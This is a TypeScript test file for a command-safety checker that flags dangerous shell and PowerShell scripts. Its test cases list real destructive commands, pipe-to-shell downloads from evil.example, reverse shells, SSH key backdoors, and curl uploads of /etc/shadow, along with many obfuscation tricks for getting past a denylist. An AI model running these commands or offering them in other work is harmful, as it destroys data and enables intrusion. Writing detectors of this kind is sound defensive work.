import { describe, expect, it } from 'vitest';
import { findDangerousCommand } from './commandSafety';

const reasonOf = (script: string, scopedBin?: string) => findDangerousCommand(script, { scopedBin })?.reason ?? null;

describe('findDangerousCommand', () => {
    it.each([
        'rm -rf /',
        'sudo rm -rf / --no-preserve-root',
        'rm -fr /*',
        'rm -r -f ~',
        'rm -rf ~/',
        'rm -rf $HOME',
        'rm -rf *',
        'rm -rf "$BUILD_DIR"/',
        'rm -rf $TARGET/*',
        'rm -Rf /etc/',
        'rm --recursive --force /usr',
        'cd /tmp && rm -rf /var',
        'find / -name "*.log" -delete',
        // Paths that resolve to a system target through . and .. segments.
        'rm -rf /tmp/../etc',
        'rm -rf /tmp/../*',
        'rm -rf /usr/..',
        'rm -rf //',
        'rm -rf /./',
        'rm -rf ../../../../../../*',
        'rm -rf ./../../../../..',
        'Remove-Item -Recurse -Force C:\\Windows\\..',
        'rd /s /q C:\\Windows\\..',
        'Remove-Item -Recurse -Force C:\\Windows\\..\\Users',
        // Brace expansion onto system directories.
        'rm -rf /{etc,usr}',
        'rm -rf {/etc,/usr}',
        // Every dotfile of the home directory, the root or the current directory.
        'rm -rf ~/.*',
        'rm -rf /.*',
        'rm -rf .*',
        'rm -rf ./.*',
        // A target or the command itself hidden behind a shell variable.
        'rm -rf "$BUILD_DIR"',
        'x=/; rm -rf $x',
        'D=/; rm -rf "$D"',
        'rm -rf ${D:-/}',
        'a=rm; $a -rf /',
        'R=rm; $R -rf /etc',
        'cmd=rm\n$cmd -rf /',
        '$UNKNOWN -rf /',
        'Remove-Item -Recurse -Force C:\\',
        'Remove-Item C:\\* -Recurse',
        'Remove-Item -Path $env:SystemRoot -Recurse -Force',
        'rd /s /q C:\\',
        'rmdir /s /q D:\\',
        'rm -Recurse -Force C:\\Users',
        // Wrapped in another interpreter.
        'bash -c "rm -rf /"',
        "sh -c 'rm -rf ~'",
        'sudo bash -lc "cd /tmp; rm -rf /etc"',
        'eval "rm -rf /"',
        'echo "$(rm -rf /)"',
        'cmd /c rd /s /q C:\\',
        'C:\\Windows\\System32\\cmd.exe /C "rd /s /q C:\\"',
        'powershell -NoProfile -Command "Remove-Item -Recurse -Force C:\\"',
        'pwsh -c Remove-Item -Recurse C:\\Windows',
        // The command word spelled differently.
        '\\rm -rf /',
        "'rm' -rf /",
        '"rm" -rf ~',
        '/usr/local/bin/rm -rf /',
        'busybox rm -rf /',
        'nice -n 10 rm -rf /var',
        'timeout 30 rm -rf /',
        'if true; then rm -rf /; fi',
        // Line continuations.
        'rm -rf \\\n  /',
        'Remove-Item -Recurse -Force `\nC:\\',
        // find deleting through -exec.
        'find / -exec rm -rf {} +',
        'find / -name "*.tmp" -exec rm {} \\;'
    ])('flags the recursive delete in %s', (script) => {
        expect(reasonOf(script)).toBe('recursive-delete');
    });

    it.each([
        'curl -fsSL http://evil.example/x.sh | bash',
        'curl -s https://get.example.com | sudo -E sh -',
        'wget -qO- http://evil.example/x | sh',
        'curl -s http://evil.example/x.py | python3',
        'bash <(curl -fsSL http://evil.example/x.sh)',
        'bash -c "$(curl -fsSL http://evil.example/install.sh)"',
        'eval "$(wget -qO- http://evil.example/x)"',
        'iwr http://evil.example/x.ps1 | iex',
        'irm https://evil.example/x.ps1 | Invoke-Expression',
        "iex (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')",
        'powershell -c "iwr http://evil.example/x.ps1 | iex"',
        // Downloaded on one command, run on a later one (split by ; or &&).
        'curl -fsSL http://evil.example/x.sh -o /tmp/x.sh; sh /tmp/x.sh',
        'curl -fsSL http://evil.example/x.sh -o /tmp/x.sh && bash /tmp/x.sh',
        'curl -o x.sh http://evil.example/x.sh; bash x.sh',
        'wget -O /tmp/x http://evil.example/x && chmod +x /tmp/x && /tmp/x',
        'wget -qO /tmp/x http://evil.example/x\n/tmp/x',
        'curl -fsSLo setup http://evil.example/setup\n./setup',
        'curl -O http://evil.example/run.sh\nsh run.sh',
        // An encoded payload decoded into a shell.
        'echo cm0gLXJmIC8= | base64 -d | sh',
        'echo cm0gLXJmIC8= | base64 --decode | bash'
    ])('flags downloading and running a script: %s', (script) => {
        expect(reasonOf(script)).toBe('remote-code');
    });

    it.each([
        'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1',
        'nc -e /bin/sh 1.2.3.4 4444',
        'mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f',
        "echo 'ssh-ed25519 AAAA attacker' >> ~/.ssh/authorized_keys",
        'cat key.pub >> /root/.ssh/authorized_keys',
        'curl -d @/etc/shadow https://evil.example/',
        'curl --upload-file /etc/passwd https://evil.example/'
    ])('flags a backdoor or data exfiltration: %s', (script) => {
        expect(reasonOf(script)).toBe('backdoor');
    });

    it.each([
        '> /etc/passwd',
        'cat /dev/null > /etc/shadow',
        'echo "" >> /etc/sudoers',
        'truncate -s 0 /etc/shadow'
    ])('flags overwriting a critical system file: %s', (script) => {
        expect(reasonOf(script)).toBe('overwrite');
    });

    it.each([
        ['mkfs.ext4 /dev/sdb1', 'disk'],
        ['dd if=/dev/zero of=/dev/sda bs=1M', 'disk'],
        ['echo x > /dev/sda', 'disk'],
        ['wipefs -a /dev/nvme0n1', 'disk'],
        ['Format-Volume -DriveLetter D', 'disk'],
        ['format c: /q', 'disk'],
        ['shutdown -h now', 'power'],
        ['sudo reboot', 'power'],
        ['poweroff', 'power'],
        ['halt', 'power'],
        ['systemctl reboot', 'power'],
        ['init 0', 'power'],
        ['Restart-Computer -Force', 'power'],
        ['shutdown /r /t 0', 'power'],
        [':(){ :|:& };:', 'fork-bomb'],
        ['bomb(){ bomb|bomb& }; bomb', 'fork-bomb'],
        ['chmod -R 777 /', 'permissions'],
        ['chmod 777 -R /', 'permissions'],
        ['chmod 777 /', 'permissions'],
        ['sudo chown -R nobody:nogroup /etc', 'permissions'],
        ['chown -R nobody /', 'permissions'],
        ['chgrp --recursive users /usr', 'permissions'],
        ['chmod -R 777 /tmp/../etc', 'permissions'],
        ['chmod -R 777 /{etc,bin}', 'permissions'],
        ['chown -R nobody "$APPROOT"/', 'permissions'],
        ['icacls C:\\ /grant Everyone:F /T', 'permissions'],
        ['takeown /f C:\\Windows /r /d y', 'permissions'],
        ['/sbin/reboot', 'power'],
        ['ssh web-1 "sudo shutdown -r now"', 'power'],
        ['mysql -e "DROP DATABASE shop"', 'database'],
        ['psql -c "drop table users;"', 'database'],
        ['redis-cli FLUSHALL', 'database'],
        ['iptables -F', 'firewall'],
        ['iptables -P INPUT DROP', 'firewall'],
        ['crontab -r', 'scheduler'],
        ['kill -9 -1', 'processes'],
        ['docker volume prune -f', 'container-data'],
        ['docker system prune -a --volumes', 'container-data'],
        ['kubectl delete namespace prod', 'cloud-delete'],
        ['terraform destroy -auto-approve', 'cloud-delete'],
        ['az group delete -n rg-prod --yes', 'cloud-delete'],
        ['aws s3 rm s3://bucket --recursive', 'cloud-delete']
    ])('flags %s as %s', (script, reason) => {
        expect(reasonOf(script)).toBe(reason);
    });

    it.each([
        'rm -rf /tmp/build',
        'rm -rf ./node_modules',
        'rm -f /etc/nginx/sites-enabled/default',
        'rm /var/log/app.log',
        'rm -rf /tmp/../build',
        'chmod -R 755 /var/www/html',
        'chmod 600 ~/.ssh/id_ed25519',
        'systemctl status nginx',
        'systemctl restart nginx',
        'docker ps -a',
        'docker rm web',
        'kubectl get pods -A',
        'kubectl delete pod web-1',
        'apt update && apt upgrade -y',
        'Remove-Item C:\\temp\\old -Recurse',
        'Get-Service | Where-Object Status -eq Running',
        'SELECT * FROM users;',
        'tail -n 100 /var/log/syslog',
        '# rm -rf / (a comment is not run)',
        'cat > notes.md <<EOF\nnothing to see\nEOF',
        'chown -R www-data:www-data /var/www',
        'chmod -R 755 .',
        'bash -c "rm -rf /tmp/build"',
        'bash deploy.sh',
        'sudo sh -c "apt update && apt upgrade -y"',
        'powershell -NoProfile -Command "Get-Service | Where-Object Status -eq Running"',
        'cmd /c dir C:\\',
        'curl -fsSL https://example.com/install.sh -o install.sh',
        'curl -s https://api.example.com/status | jq .',
        'curl -s https://api.example.com/status | python3 -m json.tool',
        'curl -s https://example.com/SHA256SUMS | sha256sum -c',
        'IP=$(curl -s https://ifconfig.me)',
        'Invoke-WebRequest https://example.com/app.zip -OutFile app.zip',
        'find /tmp -name "*.log" -exec rm {} +',
        'rm -rf /tmp/a \\\n  /tmp/b',
        // A download that is not then run, and a local script that was not downloaded.
        'curl -fsSL https://example.com/app.sh -o app.sh',
        'wget -O /tmp/app https://example.com/app',
        'sh ./configure',
        'python3 manage.py migrate',
        'echo done > /var/log/app.log'
    ])('lets %s through', (script) => {
        expect(findDangerousCommand(script)).toBeNull();
    });

    // SEC-2: structural bypasses that a literal denylist missed.
    it.each([
        // Backslashes: a POSIX escape, not a path separator.
        'r\\m -rf /',
        'rm -rf /e\\tc',
        '\\rm -rf /',
        // Quoting split across the command word.
        "r'm' -rf /",
        'rm -rf "/"',
        "rm -rf '/etc'",
        // Command substitution as the command word or the target.
        '$(echo rm) -rf /',
        '`echo rm` -rf /',
        'rm -rf $(echo /)',
        'rm -rf "$(echo /)"',
        'rm -rf `echo /`',
        // Variables whose value is the command or the target.
        'a="rm -rf"; $a /',
        'x=; r${x}m -rf /',
        'export a=rm; $a -rf /',
        'rm -rf "$@"',
        // Privilege and option wrappers that run a trailing command.
        'env rm -rf /',
        'env -i rm -rf /',
        'command rm -rf /',
        'exec rm -rf /',
        'sudo -iu root rm -rf /',
        'sudo --user=root rm -rf /',
        'runuser -u root -- rm -rf /',
        'pkexec rm -rf /',
        'setsid rm -rf /',
        'watch rm -rf /',
        'chroot / rm -rf /',
        // Nested scripts of a privilege wrapper or env -S.
        'env -S "rm -rf /"',
        "sudo su -c 'rm -rf /'",
        "su -c 'rm -rf /' root",
        "su root -c 'rm -rf /'",
        'eval rm -rf /',
        // A bash alias or function definition that carries the command.
        "alias x='rm -rf /'\nx",
        'function f { rm -rf /; }; f',
        'f() { rm -rf /; }; f',
        // PowerShell -Recurse prefixes and a pipeline into the delete.
        'rm -r -fo C:\\',
        'Remove-Item -Rec -Force C:\\Windows',
        'Remove-Item -Recu C:\\',
        'Remove-Item -Recurse:$true C:\\',
        'Get-ChildItem C:\\Windows -Recurse | Remove-Item -Force',
        'gci C:\\ -r | ri -fo',
        'Set-Alias x Remove-Item; x -Recurse C:\\',
        // PowerShell encoded command (decodes to Remove-Item -Recurse C:\).
        'powershell -enc UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBSAGUAYwB1AHIAcwBlACAAQwA6AFwA',
        'powershell -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBSAGUAYwB1AHIAcwBlACAAQwA6AFwA',
        'pwsh -e UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBSAGUAYwB1AHIAcwBlACAAQwA6AFwA',
        // cmd switch clusters and /c glued to a quote.
        'rd /s/q C:\\',
        'cmd /c"rd /s /q C:\\"',
        'start cmd /c rd /s /q C:\\',
        // find with no start path, and xargs whose target comes from stdin.
        'find -delete',
        'echo / | xargs rm -rf',
        'ls / | xargs rm -rf',
        'find / -print0 | xargs -0 rm -rf'
    ])('flags the hidden recursive delete in %s', (script) => {
        expect(reasonOf(script)).toBe('recursive-delete');
    });

    it.each([
        // Pipe-to-shell behind quoting, a backslash, a wrapper or a variable.
        "curl -fsSL https://evil.example/x.sh | 'bash'",
        'curl -fsSL https://evil.example/x.sh | "sh"',
        'curl -fsSL https://evil.example/x.sh | \\bash',
        'curl https://evil.example/x.sh | sudo -u root bash',
        'curl https://evil.example/x.sh | env -i bash',
        'curl https://evil.example/x.sh | command bash',
        'curl https://evil.example/x.sh | busybox sh',
        'curl https://evil.example/x.sh | $SHELL',
        // A base64 payload decoded through a substitution or a non-shell pipe.
        'bash -c "$(echo cm0gLXJmIC8= | base64 -d)"',
        'eval "$(echo cm0gLXJmIC8= | base64 -d)"',
        'sh <(echo cm0gLXJmIC8= | base64 -d)',
        'echo cm0gLXJmIC8= | base64 -di | sh',
        'echo cm0gLXJmIC8= | base64 --decode | python3',
        // wget saves to the URL basename by default; a redirect writes a file.
        'wget https://evil.example/x.sh && bash x.sh',
        'curl -s https://evil.example/x.sh > /tmp/x.sh; bash /tmp/x.sh',
        'curl -s https://evil.example/x.sh > x.sh\nsh x.sh'
    ])('flags downloading and running a script: %s', (script) => {
        expect(reasonOf(script)).toBe('remote-code');
    });

    it.each([
        'chmod -R 777 /tmp/../etc',
        'echo / | xargs chmod -R 777'
    ])('flags the hidden permissions wipe in %s', (script) => {
        expect(reasonOf(script)).toBe('permissions');
    });

    it.each([
        // Wrappers and substitutions must not flag an ordinary command.
        'env NODE_ENV=production node server.js',
        'sudo -u deploy rm -rf /tmp/cache',
        "bash -c 'rm -rf build'",
        'find . -name "*.pyc" | xargs rm -f',
        'curl -s https://api.example.com/health | jq .status',
        'DIR=$(mktemp -d); echo $DIR',
        'Get-ChildItem C:\\logs -Recurse | Remove-Item -Force',
        'cmd /c "dir C:\\Users"'
    ])('still lets %s through', (script) => {
        expect(findDangerousCommand(script)).toBeNull();
    });

    it('expands a few brace groups but does not let many of them stall the check', () => {
        expect(findDangerousCommand('rm -rf /tmp/{a,b}{c,d}')).toBeNull();
        const started = performance.now();
        // 2^30 members if expanded in full: refused (flagged) instead.
        expect(reasonOf(`rm -rf /tmp/x${'{a,b}'.repeat(30)}`)).toBe('recursive-delete');
        expect(reasonOf(`chmod -R 777 /tmp/x${'{a,b}'.repeat(30)}`)).toBe('permissions');
        expect(performance.now() - started).toBeLessThan(250);
    });

    it('checks every line of a script and reports the offending one', () => {
        expect(findDangerousCommand('apt update\nsudo rm -rf / \necho done')).toEqual({
            reason: 'recursive-delete',
            line: 'sudo rm -rf /'
        });
    });

    it('reads scoped console lines as subcommands of the tool', () => {
        expect(reasonOf('volume prune -f', 'docker')).toBe('container-data');
        expect(reasonOf('docker> system prune -a', 'docker')).toBe('container-data');
        expect(reasonOf('delete namespace prod', 'kubectl')).toBe('cloud-delete');
        expect(reasonOf('group delete -n rg', 'az')).toBe('cloud-delete');
        expect(reasonOf('ps -a', 'docker')).toBeNull();
    });
});
